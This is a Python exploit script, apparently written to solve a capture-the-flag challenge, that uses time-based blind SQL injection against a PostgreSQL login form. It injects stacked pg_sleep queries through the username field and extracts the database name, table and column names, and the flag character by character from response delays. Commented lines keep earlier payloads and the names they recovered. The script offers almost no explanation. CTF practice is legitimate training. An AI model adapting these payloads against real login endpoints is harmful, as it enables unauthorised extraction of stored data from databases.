import requests
from string import printable 
from time import time

url = 'https://pasteweb.ctf.zoolab.org/'
Result = ""

for i in range(1, 40):
    for j in printable:
        print(i, j)
        #Datebase_Name
        #payload = f"select case when substr(current_database(),{i},1)='{j}' then pg_sleep(2) else pg_sleep(0) end from pg_database limit 1"

        #Table_name
        #payload = f"select case when substring(table_name,{k},1)='{i}' then pg_sleep(2) else pg_sleep(0) end from information_schema.tables order by table_name"

        #column_name
        #payload = f"select case when substring(column_name,{k},1)='{i}' then pg_sleep(2) else pg_sleep(0) end from information_schema.columns where table_name='s3cr3t_t4b1e'  ;"

        #FLAG
        payload = f" select case when substring(fl4g,{i},1)='{j}' then pg_sleep(1.5) else pg_sleep(0) end from s3cr3t_t4b1e"

        username = f"1' ;" + payload  + "; -- -"
        current_time = int(time())
        value = {
            'username': username,
            'password': '',
            'current_time': current_time
        }
        try :
            r = requests.post(url, data=value, timeout=1)
        except : 
            print("error")
            Result += j
            break

    print("Answer : ", Result)
        





       #name = > pastewebdb
        #username = f"1' ; select case when substr(current_database(),{k},1)='{i}' then pg_sleep(2) else pg_sleep(0) end from pg_database limit 1 -- -"
        #table name => pasteweb_accounts 、fl4gR4aHCb1、p3cr3teb4a1counts、p3cr3peb4a1counts、p3cf3peb4a1cables、p3cf3leb4a1cables
        #username = f"1' ; select case when substring(table_name,{k},1)='{i}' then pg_sleep(2) else pg_sleep(0) end from information_schema.tables order by table_name -- -"
        #columns dump time based => user_id、user_account、user_aacounrd、user_a910unrd803、user_aacounrd | fl4g
        #username = f"1' ; select case when substring(column_name,{k},1)='{i}' then pg_sleep(2) else pg_sleep(0) end from information_schema.columns where table_name='s3cr3t_t4b1e'  ; -- -"
        #column value